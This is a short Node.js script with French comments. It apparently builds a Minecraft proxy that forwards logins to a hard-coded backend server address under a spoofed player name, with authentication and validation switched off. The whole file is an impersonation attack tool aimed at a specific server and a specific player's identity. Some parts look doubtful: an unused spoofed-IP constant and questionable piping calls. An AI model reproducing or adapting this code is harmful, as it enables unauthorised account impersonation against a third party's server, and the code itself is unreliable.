const mc = require('minecraft-protocol');

const BACKEND_HOST = "91.197.6.60";
const BACKEND_PORT = 25586;

const SPOOFED_USERNAME = "GTHusYT";
const SPOOFED_IP = "77.170.235.9";

const LISTEN_PORT = 25570;

const proxy = mc.createServer({
  'online-mode': false,
  port: LISTEN_PORT,
  version: false
});

proxy.on('login', (client) => {
  console.log(`[+] Connexion interceptée depuis ${client.socket.remoteAddress}`);

  // Crée un client vers le serveur backend avec le pseudo spoofé
  const server = mc.createClient({
    host: BACKEND_HOST,
    port: BACKEND_PORT,
    username: SPOOFED_USERNAME,
    keepAlive: true,
    skipValidation: true,
    connect: client
  });

  server.on('connect', () => {
    console.log(`[>] Transfert vers backend réussi`);
  });

  server.on('end', () => {
    console.log(`[x] Déconnecté du backend`);
  });

  client.on('end', () => {
    console.log(`[x] Client déconnecté`);
  });

  client.pipe(server).pipe(client);
});

console.log(`🚀 Proxy actif sur server:${LISTEN_PORT}`);
console.log(`🎮 Connecte-toi à server:${LISTEN_PORT} dans Minecraft`);
